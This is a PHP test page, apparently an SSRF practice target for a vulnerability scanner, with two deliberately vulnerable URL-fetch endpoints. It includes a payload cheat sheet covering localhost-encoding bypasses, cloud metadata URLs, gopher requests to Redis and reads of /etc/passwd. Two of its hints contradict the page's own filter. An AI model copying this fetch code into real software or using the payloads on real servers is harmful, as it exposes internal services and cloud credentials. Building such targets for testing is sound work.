<?php
/**
 * SSRF 服务端请求伪造漏洞靶场
 *
 * 包含两个注入点：
 * 1. GET url 参数 — 使用 file_get_contents() 获取外部 URL（有缺陷的黑名单绕过）
 * 2. GET proxy 参数 — 使用 curl 代理请求（无任何过滤）
 *
 * 黑名单绕过方式：
 * - 127.0.0.1 → 0x7f000001（十六进制）
 * - 127.0.0.1 → 2130706433（十进制）
 * - 127.0.0.1 → 0177.0.0.01（八进制）
 * - 127.0.0.1 → [::1]（IPv6）
 * - localhost → localtest.me
 * - 127.0.0.1 → 127.0.0.1.nip.io
 */

$message = '';
$result = '';
$error = '';

// ============================================
// 注入点 1: GET url 参数 — file_get_contents()
// 有缺陷的黑名单绕过
// ============================================
if (isset($_GET['url'])) {
    $url = $_GET['url'];

    // 看似安全的黑名单 — 但可以轻易绕过
    $blacklist = ['127.0.0.1', 'localhost', '169.254.169.254', '0.0.0.0'];

    $is_blocked = false;
    foreach ($blacklist as $blocked) {
        if (stripos($url, $blocked) !== false) {
            $is_blocked = true;
            break;
        }
    }

    // 额外检查 file:// 协议
    if (stripos($url, 'file://') !== false && stripos($url, 'file:///etc/') !== false) {
        $is_blocked = true;
        $error = '<div style="color:red;background:#fff0f0;padding:10px;border-radius:5px;">
            <strong>Blocked!</strong> file:// protocol to /etc/ is not allowed.
        </div>';
    }

    if ($is_blocked && empty($error)) {
        $error = '<div style="color:orange;background:#fffff0;padding:10px;border-radius:5px;">
            <strong>Blocked!</strong> The URL contains a blacklisted host: ' . htmlspecialchars($url) . '<br>
            <small style="color:#888;">Hint: try hex (0x7f000001), octal (0177.0.0.01), or IPv6 ([::1])</small>
        </div>';
    } elseif (empty($error)) {
        // 漏洞：直接使用用户输入的 URL 发起请求
        try {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 3,
                    'ignore_errors' => true,
                ],
            ]);

            $content = @file_get_contents($url, false, $context);

            if ($content === false) {
                $error = '<div style="color:orange;background:#fffff0;padding:10px;border-radius:5px;">
                    <strong>Connection failed!</strong> Could not fetch URL: ' . htmlspecialchars($url) . '<br>
                    <small style="color:#888;">The server may be trying to connect. This could be a blind SSRF.</small>
                </div>';
            } else {
                $result = $content;
                $message = '<div style="color:green;background:#f0fff0;padding:10px;border:1px solid green;border-radius:5px;">
                    <strong>Request successful!</strong> Fetched ' . strlen($content) . ' bytes from the URL.
                </div>';
            }
        } catch (Exception $e) {
            $error = '<div style="color:orange;background:#fffff0;padding:10px;border-radius:5px;">
                <strong>Error:</strong> ' . htmlspecialchars($e->getMessage()) . '
            </div>';
        }
    }
}

// ============================================
// 注入点 2: GET proxy 参数 — curl 执行
// 完全无过滤，包括支持 gopher:// 协议
// ============================================
if (isset($_GET['proxy'])) {
    $proxy_url = $_GET['proxy'];

    // 无任何过滤 — 直接 curl
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $proxy_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    // 允许所有协议（包括 gopher/dict/file）
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_ALL);
    // 允许重定向到任意协议
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_ALL);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);

    if ($curl_error) {
        $error = '<div style="color:orange;background:#fffff0;padding:10px;border-radius:5px;">
            <strong>cURL Error:</strong> ' . htmlspecialchars($curl_error) . '<br>
            <small style="color:#888;">Target URL: ' . htmlspecialchars($proxy_url) . '</small><br>
            <small style="color:#888;">This may indicate a connection to an internal service.</small>
        </div>';
    } else {
        $result = $response;
        $message = '<div style="color:green;background:#f0fff0;padding:10px;border:1px solid green;border-radius:5px;">
            <strong>Proxy request successful!</strong> HTTP ' . $http_code . ', '
            . strlen($response) . ' bytes returned.<br>
            <small>Content-Type: ' . htmlspecialchars($content_type) . '</small>
        </div>';
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>SSRF 靶场 — VulnScanner Test</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, sans-serif; max-width: 900px; margin: 40px auto; padding: 20px; background: #1a1a2e; color: #eee; }
        h1 { color: #e94560; }
        .card { background: #16213e; padding: 20px; margin: 20px 0; border-radius: 8px; border: 1px solid #0f3460; }
        .card h2 { margin-top: 0; color: #53a8b6; }
        input, textarea, button { padding: 10px; border-radius: 4px; border: 1px solid #0f3460; background: #1a1a2e; color: #eee; width: 100%; margin: 5px 0; }
        button { background: #e94560; cursor: pointer; border: none; font-weight: bold; }
        button:hover { background: #c23152; }
        .result-box { background: #0f3460; padding: 15px; border-radius: 4px; margin-top: 10px; max-height: 400px; overflow: auto; }
        .result-box pre { margin: 0; white-space: pre-wrap; word-break: break-all; font-size: 13px; }
        .hint { font-size: 12px; color: #888; margin-top: 5px; }
        code { background: #0f3460; padding: 2px 6px; border-radius: 3px; font-size: 13px; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #0f3460; }
        th { color: #53a8b6; }
    </style>
</head>
<body>
    <h1>SSRF 服务端请求伪造靶场</h1>
    <p>此靶场用于测试 VulnScanner 的 SSRF 检测能力</p>

    <?= $message ?>
    <?= $error ?>

    <!-- 注入点1: file_get_contents() URL 获取 -->
    <div class="card">
        <h2>注入点 1: GET url 参数 — file_get_contents()</h2>
        <p>输入一个 URL，服务器将使用 <code>file_get_contents()</code> 获取其内容并显示。</p>
        <p style="color:orange;font-size:13px;">
            黑名单: 127.0.0.1, localhost, 169.254.169.254, 0.0.0.0<br>
            但未阻止: 十六进制IP, 八进制IP, IPv6, DNS重绑定域名
        </p>
        <form method="GET">
            <input type="text" name="url" placeholder="输入 URL (例如: http://0x7f000001:6379/)" value="<?= htmlspecialchars($_GET['url'] ?? '') ?>" style="display:inline;width:80%;">
            <button type="submit" style="width:18%;display:inline;">获取</button>
        </form>

        <div class="hint">
            <strong>测试用例：</strong><br>
            云元数据: <code>?url=http://169.254.169.254/latest/meta-data/</code> ⛔ (被黑名单阻止)<br>
            黑名单绕过: <code>?url=http://0x7f000001:6379/</code> (十六进制 127.0.0.1)<br>
            黑名单绕过: <code>?url=http://2130706433:6379/</code> (十进制 127.0.0.1)<br>
            黑名单绕过: <code>?url=http://[::1]:6379/</code> (IPv6 localhost)<br>
            DNS重绑定: <code>?url=http://127.0.0.1.nip.io:6379/</code><br>
            文件协议: <code>?url=file:///etc/hosts</code> (不包含 /etc/ 即可)
        </div>

        <?php if (!empty($result) && isset($_GET['url'])): ?>
        <div class="result-box">
            <pre><?= htmlspecialchars(substr($result, 0, 5000)) ?></pre>
            <?php if (strlen($result) > 5000): ?>
                <p style="color:#888;">... 截断，完整响应 <?= strlen($result) ?> 字节</p>
            <?php endif; ?>
        </div>
        <?php endif; ?>
    </div>

    <!-- 注入点2: curl 代理请求（无过滤） -->
    <div class="card">
        <h2>注入点 2: GET proxy 参数 — curl 代理</h2>
        <p>输入一个 URL，服务器将使用 <code>curl</code> 获取并返回原始响应。<strong>无任何过滤！</strong></p>
        <p style="color:red;font-size:13px;">
            支持所有协议: http, https, gopher, dict, file, ftp, ldap 等
        </p>
        <form method="GET">
            <input type="text" name="proxy" placeholder="输入 URL (例如: gopher://127.0.0.1:6379/_INFO)" value="<?= htmlspecialchars($_GET['proxy'] ?? '') ?>">
            <button type="submit">代理请求</button>
        </form>

        <div class="hint">
            <strong>测试用例：</strong><br>
            内网Redis: <code>?proxy=http://127.0.0.1:6379/</code><br>
            Gopher攻击Redis: <code>?proxy=gopher://127.0.0.1:6379/_INFO</code><br>
            Dict探测Redis: <code>?proxy=dict://127.0.0.1:6379/INFO</code><br>
            文件读取: <code>?proxy=file:///etc/passwd</code><br>
            云元数据: <code>?proxy=http://169.254.169.254/latest/meta-data/</code><br>
            端口探测: <code>?proxy=http://127.0.0.1:3306/</code>
        </div>

        <?php if (!empty($result) && isset($_GET['proxy'])): ?>
        <div class="result-box">
            <pre><?= htmlspecialchars(substr($result, 0, 5000)) ?></pre>
            <?php if (strlen($result) > 5000): ?>
                <p style="color:#888;">... 截断，完整响应 <?= strlen($result) ?> 字节</p>
            <?php endif; ?>
        </div>
        <?php endif; ?>
    </div>

    <!-- 常见 SSRF Payload 速查表 -->
    <div class="card">
        <h2>SSRF Payload 速查</h2>
        <table>
            <tr>
                <th>目标</th>
                <th>Payload</th>
                <th>说明</th>
            </tr>
            <tr>
                <td>AWS 元数据</td>
                <td><code>http://169.254.169.254/latest/meta-data/</code></td>
                <td>黑名单阻止，但可通过 IPv6/IP 编码绕过</td>
            </tr>
            <tr>
                <td>阿里云元数据</td>
                <td><code>http://100.100.100.200/latest/meta-data/</code></td>
                <td>未在黑名单中</td>
            </tr>
            <tr>
                <td>Redis INFO</td>
                <td><code>gopher://127.0.0.1:6379/_INFO</code></td>
                <td>仅注入点2 (curl) 支持</td>
            </tr>
            <tr>
                <td>读取 /etc/passwd</td>
                <td><code>file:///etc/passwd</code></td>
                <td>无 /etc/ 即可通过 file_get_contents</td>
            </tr>
            <tr>
                <td>127.0.0.1 绕过 1</td>
                <td><code>http://0x7f000001/</code></td>
                <td>十六进制表示</td>
            </tr>
            <tr>
                <td>127.0.0.1 绕过 2</td>
                <td><code>http://2130706433/</code></td>
                <td>十进制表示</td>
            </tr>
            <tr>
                <td>127.0.0.1 绕过 3</td>
                <td><code>http://[::1]/</code></td>
                <td>IPv6 localhost</td>
            </tr>
            <tr>
                <td>DNS 重绑定</td>
                <td><code>http://127.0.0.1.nip.io/</code></td>
                <td>解析到 127.0.0.1</td>
            </tr>
        </table>
    </div>
</body>
</html>
